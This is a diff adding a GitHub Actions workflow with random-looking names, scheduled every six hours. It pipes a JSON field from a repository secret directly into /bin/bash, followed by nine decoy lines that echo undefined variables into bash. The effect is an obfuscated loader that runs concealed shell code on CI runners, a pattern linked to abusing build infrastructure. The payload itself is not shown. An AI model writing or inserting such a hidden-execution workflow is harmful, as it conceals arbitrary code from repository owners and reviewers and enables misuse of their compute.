@@ -1,0 +1,25 @@
+name: meijianqinggg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meijianqinggg
+        env:
+          s19320: ${{ secrets.s19320 }}
+        run: |
+          echo $s19320 | jq -r .shubb296 | /bin/bash
+          echo $xuqqa69539 | jq -r .vvn1485 | /bin/bash
+          echo $jsxqr26967 | jq -r .tej66672 | /bin/bash
+          echo $x888 | jq -r .zltg604 | /bin/bash
+          echo $dlvbt7421 | jq -r .e8607 | /bin/bash
+          echo $zyp741 | jq -r .dqa974 | /bin/bash
+          echo $qbsw35009 | jq -r .cdcts1 | /bin/bash
+          echo $gqaa0274 | jq -r .puu2 | /bin/bash
+          echo $touz525 | jq -r .qtf866 | /bin/bash
+          echo $qxme2 | jq -r .kautt82 | /bin/bash
+
